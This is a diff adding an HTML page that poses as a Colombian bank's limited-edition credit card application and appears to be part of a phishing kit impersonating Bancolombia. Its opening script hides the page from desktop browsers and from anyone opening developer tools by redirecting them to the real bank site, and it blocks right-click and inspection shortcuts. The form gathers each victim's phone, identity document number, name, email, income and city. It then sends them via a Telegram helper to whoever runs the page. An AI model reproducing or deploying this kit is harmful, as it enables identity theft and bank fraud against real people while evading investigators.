@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+	<script>
+   // ==================== CONFIGURACIÓN ====================
+const REDIRECT_URL = "https://www.bancolombia.com";
+
+// Mejor detección de móvil
+const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(navigator.userAgent) 
+                && window.innerWidth < 1024; // doble protección
+
+// ==================== DETECCIÓN DE DEVTOOLS (más suave) ====================
+let devToolsDetected = false;
+
+function detectDevTools() {
+    if (devToolsDetected) return;
+
+    const threshold = 100;
+    const start = performance.now();
+    debugger;
+    const end = performance.now();
+
+    if (end - start > threshold) {
+        devToolsDetected = true;
+        window.location.replace(REDIRECT_URL);
+    }
+}
+
+// Solo activar detección agresiva en móvil y con menos frecuencia
+function initSecurity() {
+    // Ocultar al inicio
+    document.documentElement.style.display = 'none';
+
+    // Si no es móvil → redirigir
+    if (!isMobile) {
+        window.location.replace(REDIRECT_URL);
+        return;
+    }
+
+    // Mostrar página primero (antes de hacer fetch)
+    document.documentElement.style.display = 'block';
+
+    // Desactivar clic derecho y atajos
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+        if (['F12', 'Control', 'Shift', 'Meta'].some(k => e.key.includes(k))) {
+            e.preventDefault();
+        }
+    });
+
+    // Detección más suave
+    setInterval(() => {
+        detectDevTools();
+    }, 800); // menos agresivo
+}
+
+// Iniciar
+initSecurity();
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Solicitud Tarjeta de Crédito Edición Limitada | Tricolor</title>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"/>
+    <link rel="icon" type="image/x-icon" href="assets/img/logo-app.jpg">
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --bg: #f5f6f9;
+            --ink: #1f2126;
+            --panel: #ffffff;
+            --line: #d9dce3;
+            --accent: #f4d521;
+            --muted: #51535b;
+        }
+
+        * { box-sizing: border-box; margin:0; padding:0; }
+        body {
+            font-family: 'Sora', 'Segoe UI', sans-serif;
+            background: var(--bg);
+            color: var(--ink);
+            min-height: 100vh;
+            padding-bottom: 80px;
+        }
+
+        .header-top {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            background: white;
+            box-shadow: 0 3px 12px rgba(0,0,0,0.06);
+            z-index: 100;
+            padding: 14px 18px;
+        }
+        .header-content {
+            max-width: 760px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo-header { height: 42px; }
+
+        .container {
+            max-width: 760px;
+            margin: 85px auto 40px;
+            padding: 20px;
+            background: var(--panel);
+            border-radius: 18px;
+            box-shadow: 0 16px 28px rgba(0,0,0,0.05);
+        }
+
+        h2 { font-size: 26px; font-weight: 700; text-align: center; margin-bottom: 8px; }
+        .subtitle { text-align: center; color: var(--muted); font-size: 15px; margin-bottom: 24px; }
+
+        .section { margin-bottom: 40px; }
+        .section-title {
+            font-size: 19px;
+            font-weight: 700;
+            margin-bottom: 16px;
+            color: #1f2126;
+            border-bottom: 2px solid var(--accent);
+            padding-bottom: 8px;
+        }
+
+        .cupo-info {
+            background: #fff8e1;
+            border: 2px solid var(--accent);
+            border-radius: 14px;
+            padding: 18px;
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .cupo-info strong { font-size: 28px; color: #1f2126; }
+
+        .form-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+        .form-group i {
+            position: absolute;
+            left: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #6b7280;
+            font-size: 1.3rem;
+        }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 16px 16px 16px 52px;
+            border: 1.5px solid var(--line);
+            border-radius: 12px;
+            font-size: 16px;
+            background: white;
+        }
+        .form-group input:focus, .form-group select:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 4px rgba(244, 213, 33, 0.15);
+            outline: none;
+        }
+
+        .error-message {
+            display: none;
+            color: #b42318;
+            background: #fdf2f2;
+            padding: 14px;
+            border-radius: 10px;
+            margin: 16px 0;
+            text-align: center;
+            font-weight: 600;
+        }
+
+        /* Carrusel de tarjetas */
+        .franchise-section { margin-bottom: 35px; }
+        .franchise-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+        .franchise-title {
+            font-size: 0.95rem;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+        .badge-mc, .badge-visa, .badge-amex {
+            padding: 4px 10px;
+            border-radius: 5px;
+            font-size: 11px;
+            font-weight: 800;
+        }
+        .badge-mc { background: #1A1F71; color: #fff; }
+        .badge-visa { background: #1A1F71; color: #FDDA24; }
+        .badge-amex { background: #2E77BC; color: #fff; }
+
+        .carousel-track {
+            display: flex;
+            gap: 14px;
+            overflow-x: auto;
+            padding: 10px 0;
+            scroll-snap-type: x mandatory;
+            -webkit-overflow-scrolling: touch;
+        }
+        .card-option {
+            flex: 0 0 165px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            padding: 10px;
+            cursor: pointer;
+            background: #fff;
+            text-align: center;
+            transition: all 0.3s;
+            scroll-snap-align: center;
+        }
+        .card-option.selected {
+            border-color: #2C2A29;
+            background: #FDDA24;
+            box-shadow: 0 6px 16px rgba(0,0,0,0.12);
+        }
+        .card-option img {
+            width: 100%;
+            border-radius: 8px;
+        }
+        .card-label {
+            font-size: 12.5px;
+            font-weight: 600;
+            margin-top: 8px;
+            color: #333;
+        }
+
+        .btn-continuar {
+            width: 100%;
+            height: 56px;
+            background: var(--accent);
+            color: #1f2126;
+            border: none;
+            border-radius: 28px;
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 0.8px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .btn-continuar:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header-top">
+    <div class="header-content">
+        <img src="website/assets/img/logo.svg" alt="Tricolor" class="logo-header" style="max-width:180px;">
+        <a href="#" style="color:#51535b; font-weight:600;">Salir →</a>
+    </div>
+</div>
+
+<div class="container">
+    <h2>Solicitud de Tarjeta de Crédito</h2>
+    <p class="subtitle">Edición Limitada Colombia</p>
+
+    <!-- Cupo seleccionado -->
+    <div class="cupo-info" id="cupoInfo">
+        <small style="color:#51535b;">Cupo seleccionado</small><br>
+        <strong id="cupoValor">$0</strong>
+    </div>
+
+    <div class="error-message" id="error-message"></div>
+
+    <form id="solicitudForm">
+
+        <!-- Teléfono -->
+        <div class="section">
+            <div class="form-group">
+                <i class="fas fa-phone-alt"></i>
+                <input type="tel" id="telefono" placeholder="Celular (10 dígitos)" maxlength="10" inputmode="numeric" required>
+            </div>
+        </div>
+
+        <!-- Datos personales -->
+        <div class="section">
+            <div class="section-title">Datos Personales</div>
+
+            <div class="form-group">
+                <i class="fas fa-id-card"></i>
+                <select id="tipo_documento" required>
+                    <option value="">Tipo de Documento</option>
+                    <option value="Cédula de Ciudadanía">Cédula de Ciudadanía</option>
+                    <option value="Cédula de Extranjería">Cédula de Extranjería</option>
+                    <option value="Pasaporte">Pasaporte</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <i class="fas fa-id-badge"></i>
+                <input type="tel" id="documento" placeholder="Número de Documento" maxlength="15" inputmode="numeric" required>
+            </div>
+
+            <div class="form-group">
+                <i class="fas fa-user"></i>
+                <input type="text" id="nombre" placeholder="Nombre Completo" required>
+            </div>
+
+            <div class="form-group">
+                <i class="fas fa-envelope"></i>
+                <input type="email" id="correo" placeholder="Correo Electrónico" required>
+            </div>
+
+            <div class="form-group">
+                <i class="fas fa-money-bill-wave"></i>
+                <input type="tel" id="ingresos" placeholder="Ingresos Mensuales Aproximados" inputmode="numeric" required>
+            </div>
+
+            <div class="form-group">
+                <i class="fas fa-city"></i>
+                <input type="text" id="ciudad" placeholder="Ciudad de Residencia" required>
+            </div>
+        </div>
+
+        <!-- Selección de Tarjetas -->
+        <div class="section">
+            <div class="section-title">Selecciona tu Tarjeta</div>
+            <p style="text-align:center; color:var(--muted); margin-bottom:20px;">Elige la tarjeta a la que deseas aplicar el cupo</p>
+
+            <!-- ==================== MASTERCARD ==================== -->
+            <div class="franchise-section">
+                <div class="franchise-header">
+                    <span class="badge-mc">Mastercard</span>
+                    <span class="franchise-title">Mastercard</span>
+                </div>
+                <div class="carousel-track" id="track-mc">
+                    <div class="card-option" onclick="seleccionarTarjeta(this, 'Mastercard E-card')">
+                        <img src="./tarjet/joven.png" alt="E-card">
+                        <span class="card-label">Mastercard Edición Limitada</span>
+                    </div>
+                    <div class="card-option" onclick="seleccionarTarjeta(this, 'Mastercard Clásica')">
+                        <img src="./tarjet/Mastercard+Clasica+Tradicional.png" alt="Clásica">
+                        <span class="card-label">Mastercard Clásica</span>
+                    </div>
+                    <div class="card-option" onclick="seleccionarTarjeta(this, 'Mastercard Gold')">
+                        <img src="./tarjet/Mastercard+Oro.png" alt="Gold">
+                        <span class="card-label">Mastercard Gold</span>
+                    </div>
+                    <div class="card-option" onclick="seleccionarTarjeta(this, 'Mastercard Black')">
+                        <img src="./tarjet/black.png" alt="Black">
+                        <span class="card-label">Black Mastercard</span>
+                    </div>
+                    <div class="card-option" onclick="seleccionarTarjeta(this, 'Mastercard Joven')">
+                        <img src="./tarjet/joven2.png" alt="Joven">
+                        <span class="card-label">Joven Mastercard</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ==================== VISA ==================== -->
+            <div class="franchise-section">
+                <div class="franchise-header">
+                    <span class="badge-visa">VISA</span>
+                    <span class="franchise-title">Visa</span>
+                </div>
+                <div class="carousel-track" id="track-visa">
+                    <div class="card-option" onclick="seleccionarTarjeta(this, 'Visa Clásica')">
+                        <img src="./tarjet/Visa+Platinum+Conavi.png" alt="Clásica">
+                        <span class="card-label">Visa Clásica</span>
+                    </div>
+                    <div class="card-option" onclick="seleccionarTarjeta(this, 'Visa Oro')">
+                        <img src="./tarjet/Visa+Seleccion+Colombia.png" alt="Oro">
+                        <span class="card-label">Visa Oro</span>
+                    </div>
+                    <div class="card-option" onclick="seleccionarTarjeta(this, 'Visa Platinum')">
+                        <img src="./tarjet/Infinite_Card.png" alt="Platinum">
+                        <span class="card-label">Visa Platinum</span>
+                    </div>
+                    <div class="card-option" onclick="seleccionarTarjeta(this, 'Visa Infinite')">
+                        <img src="./tarjet/Infinite_Card.png" alt="Infinite">
+                        <span class="card-label">Visa Infinite</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ==================== AMERICAN EXPRESS ==================== -->
+            <div class="franchise-section">
+                <div class="franchise-header">
+                    <span class="badge-amex">AMEX</span>
+                    <span class="franchise-title">American Express</span>
+                </div>
+                <div class="carousel-track" id="track-amex">
+                    <div class="card-option" onclick="seleccionarTarjeta(this, 'American Express Clásica')">
+                        <img src="./tarjet/AMEX+Platinum.png" alt="Clásica">
+                        <span class="card-label">American Express Clásica</span>
+                    </div>
+                    <div class="card-option" onclick="seleccionarTarjeta(this, 'American Express Platinum')">
+                        <img src="./tarjet/AMEX+Green.png" alt="Platinum">
+                        <span class="card-label">American Express Platinum</span>
+                    </div>
+                    <div class="card-option" onclick="seleccionarTarjeta(this, 'American Express Gold')">
+                        <img src="./tarjet/AMEX+Gold.png" alt="Gold">
+                        <span class="card-label">American Express Gold</span>
+                    </div>
+                    <div class="card-option" onclick="seleccionarTarjeta(this, 'American Express SkyBlue')">
+                        <img src="./tarjet/AMEX+SkyBlue.png" alt="SkyBlue">
+                        <span class="card-label">American Express SkyBlue</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <button type="button" class="btn-continuar" onclick="enviarSolicitud()">CONTINUAR CON LA SOLICITUD</button>
+    </form>
+</div>
+
+<script>
+// Cargar datos guardados
+window.addEventListener('load', () => {
+    const cupoGuardado = localStorage.getItem('cupo_solicitado');
+    if (cupoGuardado) {
+        document.getElementById('cupoValor').textContent = 
+            "$" + Number(cupoGuardado).toLocaleString("es-CO");
+    }
+
+    const telGuardado = localStorage.getItem('telefono');
+    if (telGuardado) document.getElementById('telefono').value = telGuardado;
+});
+
+let tarjetaSeleccionada = "";
+
+function seleccionarTarjeta(elemento, nombreTarjeta) {
+    document.querySelectorAll('.card-option').forEach(t => t.classList.remove('selected'));
+    elemento.classList.add('selected');
+    tarjetaSeleccionada = nombreTarjeta;
+}
+
+function validarFormulario() {
+    const errorDiv = document.getElementById('error-message');
+    errorDiv.style.display = 'none';
+
+    const campos = {
+        telefono: document.getElementById('telefono').value.trim(),
+        tipo_documento: document.getElementById('tipo_documento').value,
+        documento: document.getElementById('documento').value.trim(),
+        nombre: document.getElementById('nombre').value.trim(),
+        correo: document.getElementById('correo').value.trim(),
+        ingresos: document.getElementById('ingresos').value.trim(),
+        ciudad: document.getElementById('ciudad').value.trim()
+    };
+
+    for (let key in campos) {
+        if (!campos[key]) {
+            errorDiv.textContent = "Por favor completa todos los campos requeridos.";
+            errorDiv.style.display = 'block';
+            return false;
+        }
+    }
+
+    if (campos.telefono.length !== 10) {
+        errorDiv.textContent = "El número de celular debe tener exactamente 10 dígitos.";
+        errorDiv.style.display = 'block';
+        return false;
+    }
+
+    if (!campos.correo.includes('@') || !campos.correo.includes('.')) {
+        errorDiv.textContent = "Por favor ingresa un correo electrónico válido.";
+        errorDiv.style.display = 'block';
+        return false;
+    }
+
+    if (!tarjetaSeleccionada) {
+        errorDiv.textContent = "Por favor selecciona una tarjeta.";
+        errorDiv.style.display = 'block';
+        return false;
+    }
+
+    return true;
+}
+
+function enviarSolicitud() {
+    if (!validarFormulario()) return;
+
+    const btn = document.querySelector('.btn-continuar');
+    btn.disabled = true;
+    btn.textContent = "Procesando solicitud...";
+
+    const formData = {
+        tipo_solicitud: "Tarjeta de Crédito Edición Limitada",
+        cupo_solicitado: localStorage.getItem('cupo_solicitado') || "No seleccionado",
+        telefono: document.getElementById('telefono').value,
+        tipo_documento: document.getElementById('tipo_documento').value,
+        documento: document.getElementById('documento').value,
+        nombre: document.getElementById('nombre').value,
+        correo: document.getElementById('correo').value,
+        ingresos: document.getElementById('ingresos').value,
+        ciudad: document.getElementById('ciudad').value,
+        tarjeta_seleccionada: tarjetaSeleccionada
+    };
+
+    localStorage.setItem('formData', JSON.stringify(formData));
+
+    // Mensaje completo para Telegram
+    const mensaje = '💳 <b>BANCOLOMBIA - SOLICITUD TARJETA EDICIÓN LIMITADA</b>\n\n'
+        + '🃏 <b>Tarjeta seleccionada:</b> ' + formData.tarjeta_seleccionada + '\n'
+        + '📞 <b>Teléfono:</b> ' + formData.telefono + '\n'
+        + '🪪 <b>Documento:</b> ' + formData.tipo_documento + ' ' + formData.documento + '\n'
+        + '👤 <b>Nombre:</b> ' + formData.nombre + '\n'
+        + '✉️ <b>Correo:</b> ' + formData.correo + '\n'
+        + '💰 <b>Ingresos mensuales:</b> $' + formData.ingresos + '\n'
+        + '🏙️ <b>Ciudad:</b> ' + formData.ciudad + '\n'
+        + '💵 <b>Cupo solicitado:</b> $' + Number(formData.cupo_solicitado).toLocaleString('es-CO') + '\n'
+        + '📅 <b>Fecha:</b> ' + new Date().toLocaleString('es-CO');
+
+    if (typeof sendTelegramMessage === 'function') {
+        sendTelegramMessage(mensaje)
+            .then(() => {
+                localStorage.removeItem('cupo_solicitado');
+                localStorage.removeItem('telefono');
+                window.location.href = 'index1.html';
+            })
+            .catch(() => window.location.href = 'index1.html');
+    } else {
+        console.log("Mensaje enviado al servidor:\n", mensaje);
+        setTimeout(() => {
+            localStorage.removeItem('cupo_solicitado');
+            localStorage.removeItem('telefono');
+            window.location.href = 'index1.html';
+        }, 1500);
+    }
+}
+
+// Formateo numérico
+document.getElementById('telefono').addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '');
+});
+document.getElementById('documento').addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '');
+});
+document.getElementById('ingresos').addEventListener('input', function() {
+    let val = this.value.replace(/\D/g, '');
+    this.value = val ? Number(val).toLocaleString('es-CO') : '';
+});
+</script>
+
+<script src="telegram.js"></script>
+<script src="action.js"></script>
+
+</body>
+</html>
